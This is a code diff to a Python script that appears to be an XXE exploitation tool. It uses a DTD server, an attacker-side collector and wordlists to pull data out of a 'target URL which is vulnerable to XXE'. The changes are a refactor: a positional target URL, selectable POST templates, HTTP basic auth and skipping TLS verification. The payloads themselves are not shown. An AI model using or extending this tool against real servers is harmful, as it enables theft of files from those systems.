@@ -34,6 +34,7 @@ import threading
 from copy import deepcopy
 import logging
 import pprint
+import getpass
 #logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 settings = {
@@ -44,11 +45,7 @@ settings = {
     'dtd_host' : None,
     'dtd_port' : None,
     'collector_host' : None,
-    #Collector type specifies which protocol exfiltrated data will be sent to the attacker via, .e.g. http, ftp ...
-    'collector_type' : None,
-    'victim_host' : None,
     'sif' : None,
-    'victim_tls' : False,
     'debug': False, 
     'script_path': script_path, 
     'wordlists_path': os.path.join(script_path, 'wordlists'),
@@ -194,26 +191,26 @@ def doStartThreads():
     
 
 def doStartSmasher():
-    template_name = os.path.join(settings['script_path'],
-                                 'templates', 'smasher', 'post.http')
     smasher = Smasher(queue=settings['smasher_message_queue'], 
-                      victim_host=settings['victim_host'], 
+                      target_url=settings['target_url'],
                       dtd_server=settings['dtd_host'], 
                       dtd_port=settings['dtd_port'], 
-                      port=settings['victim_port'], 
-                      tls=settings['victim_tls'], 
-                      template_name=template_name, 
+                      template_name=os.path.join(settings['script_path'],
+                                                 'templates',
+                                                 'smasher',
+                                                 settings['template']), 
                       dtd_filename='send.dtd', 
                       exfiltrate_wordlists=settings['exfiltrate_wordlists'], 
                       debug=settings['debug'], 
-                      thread_limit=settings['thread_limit'])
+                      thread_limit=settings['thread_limit'],
+                      tls_skip_verify=settings['tls_skip_verify'],
+                      auth=settings['auth'])
     smasher.run()
-
 
 def get_ip_address(ifname):
     return ni.ifaddresses(ifname)[2][0]['addr']
 
-def main(argv):
+def main():
     set_new_log_path()
 
     parser = argparse.ArgumentParser(
@@ -234,18 +231,29 @@ def main(argv):
     parser.add_argument('--collector_port', type=int, required=True)
     parser.add_argument('--timeout')
     parser.add_argument('--sif')
-    parser.add_argument('--thread_limit', type=int, default=1, help="Speed up script by multi-threading.")
-    parser.add_argument('--victim_host', required=True, help="Target host which is vulnerable to XXE.")
-    parser.add_argument('--victim_port', type=int)
-    parser.add_argument('--victim_tls', type=int, help="Specify victim server running SSL/TLS")
+    parser.add_argument('--thread_limit', type=int, default=1,
+                        help="Speed up script by multi-threading.")
+    parser.add_argument('--template', default='post.xml',
+                        help="Use a custom template file for POST requests.")
+    parser.add_argument('--auth-user', required=False, help="Specify a username for HTTP basic authentication.")
+    parser.add_argument('--tls-skip-verify', action='store_true', help="Skip TLS certificate checking.")
+    parser.add_argument('target_url', help="Target URL which is vulnerable to XXE.")
     args = parser.parse_args()
     settings.update(vars(args))
+
+    auth_user = settings['auth_user']
+    if auth_user is not None:
+        settings['auth'] = (
+            auth_user,
+            getpass.getpass("Password for {}: ".format(auth_user)))
+    else:
+        settings['auth'] = None
 
     doStartThreads()
     
 if __name__=='__main__':
     try:
-        main(sys.argv[1:])
+        main()
     except Exception as e:
         print('Cannot run program.\n%s' %e)
         sys.exit(0)
